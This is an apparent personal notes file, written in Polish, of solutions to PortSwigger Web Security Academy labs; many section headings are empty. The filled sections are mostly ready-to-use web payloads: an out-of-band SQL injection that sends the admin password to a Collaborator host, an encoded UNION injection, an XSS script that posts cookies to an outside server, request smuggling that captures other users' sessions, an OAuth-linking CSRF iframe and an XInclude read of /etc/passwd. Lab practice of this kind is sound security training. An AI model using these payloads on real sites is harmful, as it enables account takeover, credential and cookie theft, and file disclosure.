## SQL injection
### Blind SQL injection with out-of-band data exfiltration
```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```
1. Logujemy się jako administrator zdobytym hasłem.

### SQL injection with filter bypass via XML encoding
1. StoreId podmieniamy na:
```
<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
```
Hackvertor
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```
2. Logujemy się jako administrator

## Cross-site scripting
### Exploiting cross-site scripting to steal cookies
1. Exploit server:
```js
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. Podnieniamy cookie na zdobyte i wchodzimy na '/my-account`

## Cross-site request forgery (CSRF)

## Clickjacking

## DOM-based vulnerabilities

## Cross-origin resource sharing (CORS)

## XML external entity (XXE) injection

## Server-side request forgery (SSRF)
### SSRF with blacklist-based input filter
1. Podmieniamy stockApi na:
```
http://127.1/%2561dmin
```
 
## HTTP request smuggling
### Exploiting HTTP request smuggling to capture other users' requests
1. Tworzymy request, cookie będzie w komentarzu
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

## OS command injection

## Server-side template injection

## Directory traversal

## Access control vulnerabilities

## Authentication
### Brute-forcing a stay-logged-in cookie

## WebSockets

## Web cache poisoning

## Insecure deserialization

## Information disclosure

## Business logic vulnerabilities

## HTTP Host header attacks

## OAuth authentication
### Forced OAuth profile linking
1. Podczas logowania znajdujemy link łączący konta i podmieniamy go w kodzie poniżej i przeklejamy do exploit servera (dropujemy request, żeby nie został użyty)
```js
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
```
2. Sprawdzamy czy konta są połączone

## File upload vulnerabilities

## JWT

## Essential skills
### Discovering vulnerabilities quickly with targeted scanning
Podnieniamy productId na:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Prototype pollution
